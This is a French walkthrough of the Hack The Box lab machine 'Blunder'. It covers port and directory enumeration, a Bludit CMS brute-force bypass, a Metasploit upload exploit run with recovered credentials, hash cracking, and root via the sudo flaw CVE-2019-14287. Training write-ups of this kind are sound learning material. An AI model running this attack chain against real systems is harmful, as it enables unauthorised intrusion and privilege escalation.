![Pic1](../img/blunder1.PNG?raw=true) </br>

# Introduction

Blunder est une machine linux dont l'adresse IP est 10.10.10.191.</br>
Compétences mises en oeuvre :
* Enumération des ports et services d'une machine distante.
* Enumération des fichiers et dossiers d'un site web.
* Recherche d'exploit.
* Elevation par CVE-2019-14287 (faille sudo 2019)
</br>

# Enumération initiale
Nous commençons par l'énumération des services et ports de la box avec nmap :
```bash
$ nmap -T4 -A 10.10.10.191
```
![Pic2](../img/blunder2.PNG?raw=true) </br>
Un port FTP et un port 80, nous allons faire l'énumération classique du port 80 avec dirsearch :
```bash
$ dirsearch -w wordlist -e "php,txt" -f -t 200 -x 400,403,404,500 -u http://10.10.10.191/
```
![Pic3](../img/blunder3.PNG?raw=true) </br>

# Obtenir un accès utilisateur
La page install.php contient :</br>
![Pic4](../img/blunder4.PNG?raw=true) </br>
La page todo.txt contient :</br>
![Pic5](../img/blunder5.PNG?raw=true) </br>
Nous savons donc plusieurs choses :
* Le cms Bludit est installé mais pas mis à jour.
* Le ftp est off.
* Les anciens users sont supprimés.
* Il y a un utilisateur fergus.
Nous pouvons alors chercher un exploit pour Bludit :
```bash
$ searchsploit bludit
```
![Pic6](../img/blunder6.PNG?raw=true) </br>
Le premier : Authentication Bruteforce Mitigation Bypass a un POC sur un site :</br>
https://rastating.github.io/bludit-brute-force-mitigation-bypass/
</br>
Pour l'exécuter, il nous faut un user et une liste de mot de passe, nous avons vu l'utilisateur fergus mais pas de mot de passe, nous allons utiliser l'outil cewl.</br>
Cewl est un tool qui créer une wordlist des mots provenants d'un site web :
```bash
$ cewl http://10.10.10.191 -w wordlist_htb.txt
```
On utilise la liste pour l'exploit :
```bash
$ python3 POC.py
```
![Pic7](../img/blunder7.PNG?raw=true) </br>
Nous allons continuer sur metasploit pour la suite :
```bash
$ msfconsole
msf > search bludit
msf > use exploit/linux/http/bluedit_upload_images_exec
msf > set bluditpass RolandDeschain
msf > set bludituser fergus
msf > set rhosts 10.10.10.191
msf > run
```
![Pic8](../img/blunder8.PNG?raw=true) </br>
Nous avons un shell en tant que www-data. Si on se déplace dans le répertoire parent, il y a un dossier nommé "database" avec un fichier
contenant un hash de l'admin:</br>
![Pic9](../img/blunder9.PNG?raw=true) </br>
Le hash est du SHA1, qui une fois décodé donne : Password120.</br>
Ce dernier fonctionnera avec l'utilisateur hugo, ce qui nous permet de récupérer le user.txt :
```bash
$ su hugo
$ id
$ cat /home/hugo/user.txt
```
![Pic10](../img/blunder10.PNG?raw=true) </br>

# Obtenir un accès administrateur
Pour l'élèvation de privilège, très simple, on vérifie nos droits et on voit la faille qui correspond à la CVE CVE-2019-14287 :
```bash
$ sudo -l 
$ sudo -u#-1 /bin/bash
```
![Pic11](../img/blunder11.PNG?raw=true) </br>